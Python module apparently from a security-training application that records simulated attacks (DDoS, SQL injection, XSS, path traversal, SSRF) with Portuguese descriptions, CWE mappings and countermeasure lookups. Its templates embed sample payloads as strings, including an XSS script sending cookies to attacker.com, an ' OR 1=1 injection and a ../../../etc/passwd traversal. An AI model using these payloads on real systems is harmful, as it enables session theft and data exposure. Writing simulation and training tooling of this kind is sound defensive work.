from __future__ import annotations

from typing import List, Tuple

from modules.attack.models.attack_model import AttackSimulation
from modules.inference.services.kb_service import list_countermeasures

ATTACK_TEMPLATES = {
    "ddos": {
        "description": "Ataque de Negação de Serviço Distribuída (DDoS). Múltiplos sistemas comprometidos enviam tráfego excessivo ao servidor/web alvo, sobrecarregando recursos e tornando o serviço indisponível para usuários legítimos.",
        "severity": "critical",
        "technical_details": "Volume de requisições: ~50.000 req/s | Amplificação DNS | Botnet com 10.000 nós | Consumo de banda: 40 Gbps",
    },
    "sql_injection": {
        "description": "Injeção de SQL através de inputs não sanitizados. O atacante insere comandos SQL maliciosos em campos de formulário ou parâmetros URL para acessar, modificar ou destruir dados do banco.",
        "severity": "critical",
        "technical_details": "Payload: ' OR 1=1 -- | Tabelas expostas: users, credentials, logs | Extração de dados sensíveis via UNION SELECT",
    },
    "xss": {
        "description": "Cross-Site Scripting (XSS). Injeção de scripts maliciosos em páginas web visualizadas por outros usuários. Permite roubo de sessões, redirecionamentos e coleta de dados.",
        "severity": "high",
        "technical_details": "Payload: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script> | Vetor: campo de busca não sanitizado",
    },
    "path_traversal": {
        "description": "Path Traversal. O atacante manipula caminhos de arquivos para acessar diretórios restritos fora da pasta web root.",
        "severity": "high",
        "technical_details": "Payload: ../../../etc/passwd | Acesso a arquivos de configuração e chaves SSH",
    },
    "ssrf": {
        "description": "Server-Side Request Forgery (SSRF). O servidor é induzido a fazer requisições para destinos internos não autorizados.",
        "severity": "high",
        "technical_details": "Alvo: metadata.cloud-provider.com | Acesso a serviços internos: Redis, Memcached, bancos de dados",
    },
}

ATTACK_TO_CWE = {
    "ddos": ["CWE-400"],
    "sql_injection": ["CWE-89"],
    "xss": ["CWE-79"],
    "path_traversal": ["CWE-22"],
    "ssrf": ["CWE-918"],
}


async def simulate_attack(attack_type: str, target: str, user_id: str) -> AttackSimulation:
    template = ATTACK_TEMPLATES.get(attack_type, {
        "description": f"Ataque {attack_type} simulado.",
        "severity": "medium",
        "technical_details": "Detalhes técnicos não disponíveis.",
    })

    cwe_ids = ATTACK_TO_CWE.get(attack_type, [])
    items, _ = await list_countermeasures(cwe_ids=cwe_ids, limit=10)
    countermeasures = [c.title for c in items]

    sim = AttackSimulation(
        user_id=user_id,
        attack_type=attack_type,
        target_component=target,
        severity=template["severity"],
        description=template["description"],
        technical_details=template["technical_details"],
        countermeasures=countermeasures,
    )
    await sim.insert()

    from modules.hermes.models.chat_model import HermesMessage
    await HermesMessage(
        user_id=user_id,
        role="system",
        content=f"⚠️ Ataque simulado: {attack_type.upper()} contra {target}. Severidade: {template['severity']}. {len(countermeasures)} contramedidas recomendadas.",
        has_attachment=False,
    ).insert()

    return sim


async def list_simulations(user_id: str, limit: int = 20) -> Tuple[List[AttackSimulation], int]:
    total = await AttackSimulation.find({"user_id": user_id}).count()
    items = (
        await AttackSimulation.find({"user_id": user_id})
        .sort(-AttackSimulation.created_at)
        .limit(limit)
        .to_list()
    )
    return items, total
